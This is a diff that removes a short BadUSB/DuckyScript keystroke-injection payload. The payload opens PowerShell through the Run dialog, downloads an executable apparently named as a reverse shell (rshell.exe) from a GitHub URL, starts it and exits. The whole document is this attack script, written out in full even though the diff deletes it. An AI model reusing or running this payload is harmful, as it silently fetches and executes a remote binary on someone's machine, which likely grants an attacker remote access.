@@ -1,8 +1,0 @@
-WINDOWS r
-DELAY 200
-ALTSTRING powershell.exe
-ENTER
-DELAY 500
-ALTSTRING cd ~; Invoke-WebRequest https://github.com/pyth0g/rshell/raw/main/rshell.exe -OutFile rshell.exe; start rshell.exe; exit
-DELAY 200
-ENTER
